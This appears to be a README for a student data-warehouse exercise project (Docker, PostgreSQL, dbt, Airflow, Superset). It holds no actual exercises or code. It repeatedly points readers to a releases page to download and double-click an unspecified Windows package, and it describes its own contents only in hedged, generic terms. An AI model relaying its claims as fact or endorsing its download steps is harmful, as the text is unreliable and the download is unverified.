# 📊 data-analytics-exercises - Learn modern data pipelines

[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases)

## 🧭 What this is

data-analytics-exercises is a hands-on set of data warehouse exercises for students. It helps you build a full ELT pipeline on Windows with Docker, PostgreSQL, dbt, Airflow, and Superset.

You work through a medallion setup:

- Bronze for raw data
- Silver for cleaned data
- Gold for reports and charts

The project is built for learning by doing. You run the stack, load data, transform it, and view results in dashboards.

## 📥 Download

Visit this page to download the files for Windows:

https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases

Look for the latest release and download the Windows package or archive from that page.

## 💻 What you need on Windows

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 20 GB of free disk space
- Docker Desktop installed
- A web browser such as Chrome, Edge, or Firefox

For best results, use a machine with 16 GB of RAM or more.

## 🚀 Getting started

Follow these steps in order.

### 1. Download the release

Open the releases page:

https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases

Download the latest Windows file from the release list.

If the file comes as a ZIP archive, save it to your Downloads folder or Desktop.

### 2. Unzip the files

If you downloaded a ZIP file:

- Right-click the file
- Select Extract All
- Choose a folder you can find again, such as `C:\data-analytics-exercises`

Keep the folder path short if possible.

### 3. Install Docker Desktop

This project runs in containers. Docker Desktop keeps the tools together and starts them for you.

If you do not have Docker Desktop yet:

- Download it from the Docker website
- Install it with the default options
- Restart your computer if Windows asks you to do so

After installation, open Docker Desktop and wait until it says it is running.

### 4. Open the project folder

Go to the folder where you extracted the files.

You should see files and folders for the stack, such as:

- Docker setup files
- dbt project files
- Airflow files
- SQL folders
- exercise files

### 5. Start the stack

Open the folder that contains the setup files.

If the release includes a start file, double-click it or run the command shown in the release notes.

If the project uses Docker Compose, it will start the services you need, such as:

- PostgreSQL for storage
- Airflow for workflow tasks
- dbt for data transforms
- Superset for charts and reports

Wait until all services finish starting.

### 6. Open the tools in your browser

After the stack starts, open the tools from your browser.

Common local addresses are:

- Airflow: `http://localhost:8080`
- Superset: `http://localhost:8088`
- PostgreSQL: used by the app in the background

Use the login details from the release files if they are included.

### 7. Work through the exercises

The exercises usually move through three layers:

- Bronze: bring in the raw data
- Silver: clean and shape the data
- Gold: build tables for analysis

You may be asked to:

- Load sample data
- Run dbt models
- Check Airflow tasks
- Review SQL queries
- Build simple dashboards in Superset

Follow the exercise files in the order they appear.

## 🧱 Project structure

You will likely find folders like these:

- `airflow` for workflow jobs
- `dbt` for data models
- `sql` for queries and table setup
- `docker` for container settings
- `data` for sample files
- `docs` for exercise notes

This layout helps you move from raw data to finished reports.

## 🛠️ Common tasks

### Run dbt models

dbt turns raw tables into clean tables for analysis. In this project, dbt helps create the silver and gold layers.

### Check Airflow

Airflow schedules and runs tasks in the right order. Use it to see when jobs run and whether they passed.

### View dashboards in Superset

Superset lets you explore the final data. You can build charts, tables, and dashboards from the gold layer.

### Use PostgreSQL

PostgreSQL stores the data while you work. It acts as the main database for the exercises.

## 🧪 What you will learn

By finishing the exercises, you will practice:

- Loading data into a warehouse
- Cleaning data with SQL
- Building layered data models
- Making star schema tables
- Using Airflow for scheduled jobs
- Using dbt for transformations
- Creating dashboards in Superset
- Working with Docker on Windows

## 🔧 If something does not start

If the stack does not open the first time:

- Check that Docker Desktop is running
- Close and reopen the project
- Make sure no other app uses ports 8080 or 8088
- Restart Windows if Docker asks for it
- Wait a full minute after starting the stack

If a browser page does not load, refresh it once the services finish starting.

## 🗂️ Suggested path for students

A simple way to use the project is:

1. Start the stack
2. Open Airflow
3. Run the data load tasks
4. Run the dbt models
5. Open Superset
6. Review the final charts
7. Compare results with the exercise file

This gives you a clear path from raw data to reports.

## 📌 Topics covered

This repository includes work around:

- Apache Airflow
- Apache Superset
- Data analytics
- Data engineering
- Data pipelines
- Data warehouse design
- dbt
- Dimensional modeling
- Docker
- Docker Compose
- Education
- ELT
- ETL pipeline
- Exercises
- Medallion architecture
- PostgreSQL
- Python
- SQL
- Star schema
- Student learning

## 🔗 Download again

If you need the release page again, use this link:

https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases